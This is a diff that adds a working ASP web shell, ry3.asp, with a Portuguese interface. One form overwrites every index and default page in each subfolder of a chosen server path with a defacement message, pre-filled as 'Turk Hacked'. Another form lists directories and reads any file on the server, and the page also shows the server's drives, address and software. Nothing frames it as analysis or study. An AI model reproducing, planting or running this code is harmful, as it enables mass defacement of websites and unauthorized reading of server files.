@@ -1,0 +1,282 @@
+<%
+On Error Resume Next
+Set Objeto=Server.CreateObject("Scripting.FileSystemObject")
+if request("t5") <> "" then
+ Set ObjPasta = Objeto.GetFolder(request("t5"))
+end if
+%>
+<%On Error Resume Next
+if request("t3") <> "" then
+Set ObjPasta2 = Objeto.GetFolder(request("t3"))
+set ObjFso=server.CreateObject("Scripting.FileSystemObject")
+var_caminho=request("t3")
+For Each Pasta in ObjPasta2.Subfolders
+ Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.htm", 2, True, False)
+ ObjAbreArq.writeline request("t4")
+ set ObjAbreArq = nothing   
+ Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.html", 2, True, False)
+ ObjAbreArq.writeline request("t4")
+ set ObjAbreArq = nothing   
+ Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\index.asp", 2, True, False)
+ ObjAbreArq.writeline request("t4")
+ set ObjAbreArq = nothing   
+ Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.htm", 2, True, False)
+ ObjAbreArq.writeline request("t4")
+ set ObjAbreArq = nothing   
+ Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.html", 2, True, False)
+ ObjAbreArq.writeline request("t4")
+ set ObjAbreArq = nothing   
+ Set ObjAbreArq = ObjFso.OpenTextFile(Var_Caminho & "\" & pasta.name & "\default.asp", 2, True, False)
+ ObjAbreArq.writeline request("t4")
+ if err then
+   response.write "<font color=red><br>Erro em: </font>" & pasta.name
+   err=0
+ else
+   response.write "<br>OK em " & pasta.name
+ end if   
+ set ObjAbreArq = nothing   
+next
+set ObjFso=nothing
+Set ObjPasta2 = nothing
+set ObjFso = nothing
+end if
+%>
+<html><head><title>.</title></head>
+<body>
+<center><b><font face="Tahoma" size="2">Voc? est? em: <%=server.mappath("ry3.asp")%>
+</font></b>
+<form method=POST action=ry3.asp>
+  <b><font face="Tahoma" size="2">Caminho:</font></b> <input type="text" name="T3" size="44"><br>
+  <b><font face="Tahoma" size="2">Texto</font></b>:<input type="text" name="T4" size="77" value="By Metlak  ownz !!!! Turk Hacked&gt;&gt;&gt;&gt;!!!">
+  <input type="submit" value="Iniciar" name="B1" style="border-style: solid; border-width: 1">
+</form>
+</center>
+<form method="POST" action="ry3.asp">
+  <p align="center"><b><font face="Tahoma" size="2">Prompt:</font></b> <input type="text" name="T5" size="43" value= <%=request("t5")%> ><input type="submit" value="Dir" name="B1" style="border-style: solid; border-width: 1"></p>
+</form>
+<div align="center">
+  <center>
+  <table border="1" width="70%" bordercolor="#000000" cellspacing="0" cellpadding="0" style="border-collapse: collapse">
+    <tr>
+      <td width="50%">
+        <p align="center"><b><font face="Tahoma" size="2">Diret?rios Numerados</font></b></td>
+      <td width="50%">
+        <p align="center"><b><font face="Tahoma" size="2">Arquivos</font></b></td>
+    </tr>
+    <tr>
+      <td width="50%" valign="top">
+     <% On Error Resume Next
+     dim contador
+     contador=1
+      For Each Pasta in ObjPasta.Subfolders
+         Response.Write Contador & "-) "& Pasta.Name & "<br>"
+         contador=contador+1
+      next%>&nbsp;</td>
+      <td width="50%" valign="top">
+     <%On Error Resume Next
+       For Each Arquivo in ObjPasta.Files
+         Response.Write Arquivo.Name & "<br>"
+       Next%> &nbsp;</td>
+    </tr>
+  </table>
+  </center>
+</div>
+<form method="POST" action="ry3.asp">
+   <p align="center"><b><font face="Tahoma" size="2">Caminho:</font></b> <input type="text" name="TT" size="39">
+   <input type="submit" value="Ver Arquivo" name="B1" style="border-style: solid; border-width: 1"></p>
+</form>
+<%On Error Resume Next
+if request("tt") <> "" then
+          var_caminho=request("tt")
+          set ObjFso2=server.CreateObject("Scripting.FileSystemObject")
+          Set ObjAbreArq2 = ObjFso2.OpenTextFile(Var_Caminho, 1, True, False)
+           Do While Not ObjAbreArq2.AtEndOfStream
+              Linha = Linha & ObjAbreArq2.Readline & chr(13)
+           Loop
+           response.write "<TEXTAREA NAME=sujos ROWS=10 COLS=70>" & Linha & "</TEXTAREA>"
+           ObjAbreArq2.Close
+           Set ObjAbreArq2 = Nothing
+           ObjFso2.close
+           set ObjFso2 = Nothig
+end if%>
+<table width="100%" border="1" cellspacing="0" cellpadding="0" height="8" style="border-collapse: collapse" bordercolor="#808080">
+  <tr>
+    <td bgcolor="#FFFFFF" height="10" bordercolor="#000000">
+      <div align="center"><b> <font face="Tahoma" size="2">Sistema
+        de Informa&ccedil;&atilde;o</font></b></div>
+    </td>
+  </tr>
+</table>
+<div align="center">
+  <p align="left"><b><font face="Tahoma" size="2" color="#000000">Endere&ccedil;o:</font></b><font color="#000000" face="Tahoma" size="2">
+    <font face="Verdana" size="2"><%=request.servervariables("LOCAL_ADDR")%></font></font><b><font face="Tahoma" size="2" color="#808080"><br>
+    <font color="#000000">Servidor:</font> </font></b>
+  <font color="#000000" face="Tahoma" size="2"><%=request.servervariables("SERVER_SOFTWARE")%>
+    <br>
+    Informa&ccedil;&otilde;es de sistema operacional e etc, est&atilde;o em Outras
+    Informa&ccedil;&otilde;es!</font>
+    <%
+      DIM fs, d, dc, s, n, sp
+      Set fs=Server.Createobject("Scripting.FileSystemObject")
+      Set dc=fs.drives
+%>
+  </p>
+  <table border="0" width="750">
+    <tr bgcolor="#C0C0C0" bordercolor="#C0C0C0">
+      <td style="border: 1px solid #000000; " bgcolor="#FFFFFF">
+        <div align="left"><b><font face="Verdana" size="2" color="#000000">Letra</font></b></div>
+      </td>
+      <td style="border: 1px solid #000000; " bgcolor="#FFFFFF">
+        <div align="left"><b><font face="Verdana" size="2" color="#000000">Tipo
+          de Drive</font></b></div>
+      </td>
+      <td style="border: 1px solid #000000; " bgcolor="#FFFFFF">
+        <div align="left"><b><font color="#000000" face="Verdana" size="2">Volume</font></b></div>
+      </td>
+      <td style="border: 1px solid #000000; " bgcolor="#FFFFFF">
+        <div align="left"><b><font face="Verdana" size="2" color="#000000">Sistema
+          de arquivo</font></b></div>
+      </td>
+      <td style="border: 1px solid #000000; " bgcolor="#FFFFFF">
+        <div align="left"><b><font face="Verdana" size="2" color="#000000">Espa?o
+          Livre</font></b></div>
+      </td>
+      <td style="border: 1px solid #000000; " bgcolor="#FFFFFF">
+        <div align="left"><b><font face="Verdana" size="2" color="#000000">Tamanho
+          Total</font></b></div>
+      </td>
+    </tr>
+    <%
+    back1="#D3E2E7"
+    back2="#AFFEDE"
+    back=back2
+    FOR EACH d IN dc
+    IF (back=back2) THEN
+      back=back1
+    ELSE
+      back=back2
+    END IF
+     
+  %>
+    <tr>
+      <td bordercolor="#808080">
+        <div align="left"><font face="Tahoma" size="2" color="#000000"> <%=d.driveletter%></font></div>
+      </td>
+      <td bordercolor="#808080">
+        <div align="left"><font face="Tahoma" size="2" color="#000000">
+          <%
+      IF d.DriveType = 0 Then
+        s = "Unknown"
+        IF d.VolumeName = "" Then
+          n = "&nbsp;"
+        Else
+          n = d.VolumeName
+        END IF
+      ELSEIF d.drivetype=1 THEN
+        s="Removable"
+        IF d.isready THEN
+          n=d.volumename
+        ELSE
+          n="--"
+        END IF
+      ELSEIF d.drivetype=2 THEN
+         s="Fixed"
+         IF d.isready THEN
+           n=d.volumename
+         ELSE
+           n="--"
+         END IF
+      ELSEIF d.drivetype=3 THEN
+        s="Network"
+        IF d.isready THEN
+          n=d.sharename
+        ELSE
+          n="--"
+        END IF
+      ELSEIF d.drivetype=4 THEN
+        s="CDROM"
+        IF d.isready THEN
+          n=d.volumename
+        ELSE
+          n="--"
+        END IF
+      ELSEIF d.drivetype=5 THEN
+        s="RAM Disk"
+        IF d.isready THEN
+          n=d.volumename
+        ELSE
+          n="--"
+        END IF
+      END IF
+      response.write(s)
+    %></font></div>
+      </td>
+      <td bordercolor="#808080">
+        <div align="left"><font face="Tahoma" size="2" color="#000000"> <%=n%></font></div>
+      </td>
+      <td bordercolor="#808080">
+        <div align="left"><font face="Tahoma" size="2" color="#000000">
+          <%
+      str=""
+     
+      str=str & d.driveletter
+      str=str & ":"
+           
+      'response.write(str)
+      IF d.isready THEN
+        set sp=fs.getdrive(str)
+        response.write(sp.filesystem)
+      ELSE
+        response.write("--")
+      END IF
+    %></font></div>
+      </td>
+      <td bordercolor="#808080">
+        <div align="left"><font face="Tahoma" size="2" color="#000000">
+          <%
+      str=""
+     
+      str=str & d.driveletter
+      str=str & ":"
+           
+      'response.write(str)
+      IF d.isready THEN
+        freespace = (d.AvailableSpace / 1048576)
+        set sp=fs.getdrive(str)
+        response.write(Round(freespace,1) & " MB")
+      ELSE
+        response.write("--")
+      END IF
+    %></font></div>
+      </td>
+      <td bordercolor="#808080">
+        <div align="left"><font face="Tahoma" size="2" color="#000000">
+          <%
+      str=""
+     
+      str=str & d.driveletter
+      str=str & ":"
+           
+      'response.write(str)
+      IF d.isready THEN
+        totalspace = (d.TotalSize / 1048576)
+        set sp=fs.getdrive(str)
+        response.write(Round(totalspace,1) & " MB")
+      ELSE
+        response.write("--")
+      END IF
+    %></font></div>
+      </td>
+    </tr>
+    <%NEXT%>
+  </table>
+  <table width="750" border="0">
+    <tr>
+      <td></td>
+    </tr>
+  </table>
+</div>
+</body>
+<%set ObjPasta = nothing
+set Objeto = nothing%>
+</html>
